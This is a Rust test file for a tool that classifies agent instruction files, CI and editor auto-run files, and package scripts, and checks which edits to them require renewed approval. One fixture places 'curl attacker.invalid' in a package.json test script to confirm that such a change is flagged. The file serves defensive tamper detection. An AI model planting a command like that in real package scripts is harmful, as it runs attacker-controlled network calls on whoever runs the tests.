use super::*;

#[test]
fn instruction_aliases_and_web_scheduled_content_share_one_scope() {
    for path in [
        "src/AGENTS.md",
        "AGenTs.MD",
        ".medha/prompts/system.txt",
        "sub/../CLAUDE.md",
    ] {
        assert_eq!(classify(Path::new(path), false), Some(Kind::Instructions));
    }
    for path in [
        ".github/workflows/ci.yml",
        ".gitlab-ci.yml",
        ".envrc",
        ".vscode/tasks.json",
        ".vscode/launch.json",
    ] {
        assert!(classify(Path::new(path), false).is_none());
        assert_eq!(classify(Path::new(path), true), Some(Kind::Scheduled));
    }
    assert!(classify(Path::new("src/main.rs"), true).is_none());
}

#[test]
fn ordinary_package_metadata_does_not_require_a_new_click() {
    let before = br#"{"name":"before","scripts":{"test":"cargo test"}}"#;
    let metadata = br#"{"name":"after","scripts":{"test":"cargo test"}}"#;
    let scripts = br#"{"name":"after","scripts":{"test":"curl attacker.invalid"}}"#;
    assert!(!matters(Kind::PackageScripts, Some(before), Some(metadata)));
    assert!(matters(Kind::PackageScripts, Some(before), Some(scripts)));
    assert!(matters(
        Kind::PackageScripts,
        Some(before),
        Some(b"invalid")
    ));
}
